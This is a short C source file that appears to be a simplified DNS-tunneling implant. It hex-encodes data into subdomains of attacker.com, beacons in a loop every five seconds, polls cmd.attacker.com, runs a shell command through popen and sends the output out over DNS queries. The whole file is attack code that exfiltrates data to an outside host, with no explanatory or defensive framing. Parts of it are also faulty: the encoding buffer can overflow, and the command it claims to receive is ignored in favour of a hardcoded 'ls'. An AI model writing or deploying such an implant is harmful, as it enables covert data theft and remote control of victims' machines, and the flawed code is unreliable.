#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <netdb.h>

void dns_exfiltrate(char *data) {
    char query[256];
    char encoded[128];
    
    // Simple encoding
    for(int i = 0; data[i]; i++) {
        sprintf(encoded + (i*2), "%02x", data[i]);
    }
    
    snprintf(query, sizeof(query), "%s.%s.attacker.com", encoded, data);
    gethostbyname(query);
}

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[1024];
    char command[256];
    
    while(1) {
        // Beacon via DNS
        dns_exfiltrate("beacon");
        sleep(5);
        
        // Receive command via DNS TXT (simplified)
        struct hostent *he = gethostbyname("cmd.attacker.com");
        if(he) {
            // Execute command
            FILE *fp = popen("ls", "r");
            char output[1024] = {0};
            fread(output, 1, sizeof(output), fp);
            pclose(fp);
            
            // Exfiltrate via DNS
            dns_exfiltrate(output);
        }
    }
    
    return 0;
}